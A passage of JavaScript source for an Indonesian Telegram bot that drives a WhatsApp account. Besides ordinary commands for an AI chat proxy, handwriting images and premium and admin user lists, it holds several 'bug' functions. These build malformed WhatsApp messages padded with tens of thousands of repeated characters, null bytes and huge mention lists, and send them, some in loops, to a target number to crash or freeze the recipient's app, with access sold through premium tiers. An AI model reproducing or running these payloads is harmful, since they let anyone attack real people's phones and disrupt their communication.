        messages: [{ content: text, role: "user" }],
        prompt: "",
        temperature: 0.5
      },
      {
        headers: {
          Accept: "*/*",
          "User-Agent": "Mozilla/5.0 (TelegramBot)"
        }
      }
    );

    const result = response.data?.response || response.data?.message || response.data;

    await bot.sendMessage(chatId, `💬 *AI Response:*\n\n${result}`, {
      parse_mode: "HTML",
      disable_web_page_preview: true
    });
  } catch (err) {
    console.error("❌ Error saat memanggil API:", err?.response?.data || err.message);
    await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses permintaan AI.");
  }
});

bot.onText(/^\/nulis(?: (.+))?/, async (msg, match) => {
  const enabled = true;
  const goodbyeEnabled = true;
  if (!enabled) return;

  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "Mau nulis apa? Contoh:\n/nulis aku sayang kamu"
    );
  }

  try {
    const response = await axios.post(
      "https://lemon-write.vercel.app/api/generate-book",
      {
        text,
        font: "default",
        color: "#000000",
        size: "32",
      },
      {
        responseType: "arraybuffer",
        headers: { "Content-Type": "application/json" },
      }
    );

    await bot.sendPhoto(chatId, Buffer.from(response.data));
  } catch (error) {
    console.error("Nulis error:", error.message);
    bot.sendMessage(chatId, "❌ Error, coba lagi nanti ya.");
  }
});

// Fungsi untuk mengaktifkan/menonaktifkan plugin
module.exports = {
  enable() {
    enabled = true;
    console.log("[PLUGIN] Nulis diaktifkan");
  },
  disable() {
    enabled = false;
    console.log("[PLUGIN] Nulis dinonaktifkan");
  },
};

bot.onText(/^\/DELBUG\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, 'Lu Gak Punya Access Tolol...');
    }

    const q = match && match[1] ? match[1].trim() : null;
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\nContoh: /DelBug 62xxx`);
    }

    let pepec = q.replace(/[^0-9]/g, "");
    if (!pepec.startsWith("62")) {
        return bot.sendMessage(chatId, `Contoh : /DelBug 62xxx`);
    }

    const target = `${pepec}@s.whatsapp.net`;
    const clearBugText = "xꜰʟᴏᴡᴄʟᴏᴜᴅ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nxꜰʟᴏᴡᴄʟᴏᴜᴅ";

    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { text: clearBugText });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Shadow!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/xpairing (.+)/, async (msg, match) => {
       const chatId = msg.chat.id;
       if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
       return bot.sendMessage(
       chatId,
 `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
       { parse_mode: "HTML" }
       );
       }
       const botNumber = match[1].replace(/[^0-9]/g, "");

       try {
       await connectToWhatsApp(botNumber, chatId);
       } catch (error) {
       console.error("Error in addbot:", error);
       bot.sendMessage(
       chatId,
       "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
      );
      }
      });
      
bot.onText(/^\/gconly (on|off)/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
      
      if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }
      const mode = match[1].toLowerCase();
      const status = mode === "on";
      setGroupOnly(status);

      bot.sendMessage(msg.chat.id, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, {
      parse_mode: "HTML",
      });
      });
      
bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
     const chatId = msg.chat.id; 
     const response = setCooldown(match[1]);

     bot.sendMessage(chatId, response); });

const moment = require('moment');
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
     }

     if (!match[1]) {
     return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
     }

     const args = match[1].split(' ');
     if (args.length < 2) {
     return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
     }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1];
  
    if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
    }
  
    if (!/^\d+[dhm]$/.test(duration)) {
   return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
   }
   
    const now = moment();
    const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

    if (!premiumUsers.find(user => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
    bot.sendMessage(chatId, `
✅Berhasil, kini user ${userId} Sudah memiliki akses premium hingga ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
    } else {
    const existingUser = premiumUsers.find(user => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
     }
     });

bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "HTML" });
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id
      
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);

        { parse_mode: "HTML" }
   
        }

      if (!match || !match[1]) 
      return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      
      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId,`
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      }

      if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      console.log(`${senderId} Added ${userId} To Admin`);
      bot.sendMessage(chatId, `
✅Berhasil menambahkan admin, kini user ${userId} Memiliki aksess admin. `);
      } else {
      bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
      }
      });

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
          const chatId = msg.chat.id;
          const senderId = msg.from.id;
          if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
          return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
          }
          if (!match[1]) {
          return bot.sendMessage(chatId,`
❌ Command salah! Contoh /delprem 584726249 30d.`);
          }
          const userId = parseInt(match[1]);
          if (isNaN(userId)) {
          return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
          }
          const index = premiumUsers.findIndex(user => user.id === userId);
          if (index === -1) {
          return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di dalam list premium.`);
          }
                premiumUsers.splice(index, 1);
                savePremiumUsers();
         bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium. `);
         });

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
        const chatId = msg.chat.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,

        { parse_mode: "HTML" }
        );
        }
        if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
        if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const adminIndex = adminUsers.indexOf(userId);
        if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
        } else {
        bot.sendMessage(chatId, `❌ User ${userId} Belum memiliki aksess admin.`);
        }
        });

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);

    if (result.error) {
        bot.sendMessage(chatId, `⚠️ ${result.error}`);
    } else {
        let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});

// function delay
async function BulldoEso(jid, sock) {
  const msg = {
    aiRichResponseMessage: {
      text: "\x10".repeat(20000),
      codeMetadata: {
        highlightType: 99999999,
        language: "javascript",
        title: "{}"
      },
      codeSnippet: "\n".repeat(20000),

      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: jid } }]
          }
        ]
      }
    ]
  });

  console.log(chalk.red(`succes send to ${jid}`));
}

async function boegProtocol(jid, sock, mention) {
try {
  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }
     let mentionedList = [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ];

    let embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬" + "ោ៝".repeat(20000),
        title: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/snitch",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    let videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256:  "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: type,
          directPath:  "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * 20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg1 = generateWAMessageFromContent(jid, message, {});
  const msg2 = generateWAMessageFromContent(jid, {
  viewOnceMessage: { 
             message: { 
             videoMessage 
             },
           },
         }, 
      {});

  for (const msg of [msg1, msg2]) {
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
 }     if (mention) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬" },
                content: undefined
            }]
        });
    } 
  }catch (err) {
      console.error(err);
 }
console.log(chalk.red(`Success Sent Bulldozer to ${jid}`))
}

async function BlankDelay(jid, sock) {
  let button = []; 
  
  for (let i = 0; i < 555; i++) {
    button.push(
      {
        buttonId: "OndetPcx",
        buttonText: {
          displayText: "ꦾ".repeat(5000)
        },
        type: 1
      },
      {
        buttonId: "PepekJuleAnget",
        buttonText: {
          displayText: "ꦾ".repeat(5000)
        },
        type: 1
      },
      {
        buttonId: "Yareu",
        buttonText: {
          displayText: "ꦾ".repeat(5000)
        },
        type: 1
      }
    );
  }
  
  const msg = {
    buttonsMessage: {
      contentText: "꧀".repeat(10000),
      footerText: "ꦾ".repeat(20000),
      headerType: 1,
      text: "ꦾ".repeat(5000), 
      buttons: button
    },
    contextInfo: {
      mentionedJid: [
        "13135550202@s.whatsapp.net", 
        ...Array.from(
          { length: 2000 },
          () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        )
      ],
      stanzaId: "X",
      participant: jid,
      remoteJid: jid,
      quotedMessage: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
          fileName: "Ondet Redy Vcs",
          fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
          directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1724474503",
          contactVcard: true,
          thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
          thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
          thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
          jpegThumbnail: ""
        },
        contextInfo: {
          mentionedJid: [
            "13135550202@s.whatsapp.net", 
            ...Array.from(
              { length: 2000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    }
  };

  await sock.relayMessage(jid, msg, {
    messageId: null,
    participant: { jid: jid }
  });
}

async function bulldzoerX(jid) {
  await sock.relayMessage(
    jid,
    {
      messageContextInfo: {
        deviceListMetadata: {
          senderTimestamp: "1762522364",
          recipientKeyHash: "Cla60tXwl/DbZw==",
          recipientTimestamp: "1763925277"
        },
        deviceListMetadataVersion: 2,
        messageSecret: "QAsh/n71gYTyKcegIlMjLMiY/2cjj1Inh6Sd8ZtmTFE="
      },
      eventMessage: {
        contextInfo: {
          expiration: 0,
          ephemeralSettingTimestamp: "1763822267",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "UNKNOWN",
            initiatedByMe: true
          }
        },
        isCanceled: true,
        name: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
        location: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        },
        startTime: "1764032400",
        extraGuestsAllowed: true,
        isScheduleCall: true
      }
    },
    { participant: { jid: jid } }
  );
}

async function tes100(jid, sock) {
  const viewOnceMsg = generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "99999999999999999",
          height: "9999999999999999",
          width: "9999999999999999",
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
          mediaKeyTimestamp: "172519628",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyEiIzFRMjNBYQBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
          streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
          caption: "ꦾ".repeat(20000) + "ꦾ".repeat(60000),
          contextInfo: {
            stanzaId: "Thumbnail.id",
            isForwarded: true,
            forwardingScore: 999,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }
  }, {});

  const Payment_Info = generateWAMessageFromContent(jid, {
    interactiveResponseMessage: {
      body: {
        text: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: "\u0000".repeat(1045000),
        version: 3
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [jid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
      }]
    }]
  });
  
  await sock.relayMessage("status@broadcast", Payment_Info.message, {
    messageId: Payment_Info.key.id,
    statusJidList: [jid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
      }]
    }]
  });
}

async function delayhard1(jid, sock) {
  for (let i = 0; i < 1000; i++) {
    const delay = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0018".repeat(100000),
              version: 3
            }
          }
        }
      }
    };
    await sock.sendMessage(jid, delay);
  }
}

async function delayhard2(jid, sock) {
